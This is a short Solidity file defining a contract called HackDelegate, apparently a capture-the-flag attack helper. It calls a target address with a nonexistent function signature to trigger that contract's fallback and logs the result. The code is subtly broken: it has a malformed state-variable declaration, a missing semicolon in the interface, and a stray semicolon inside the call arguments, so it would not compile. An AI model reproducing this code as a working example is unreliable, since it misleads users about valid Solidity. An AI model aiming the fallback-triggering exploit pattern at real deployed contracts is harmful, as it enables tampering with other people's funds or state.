// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDelegate {
  fallback() external
}

contract HackDelegate {
  IDelegate = delegateAddress;
  event Successful(bool success, bytes data);

  constructor(IDelegate _delegateAddress) public {
    delegateAddress = IDelegate(_delegateAddress);
  }

  function callFallback(address _addr) public {
    (bool success, bytes memory data) = _addr.call(
      abi.encodeWithSignature("notAFunction()");
    );

    emit Successful(success, data);
  }
}
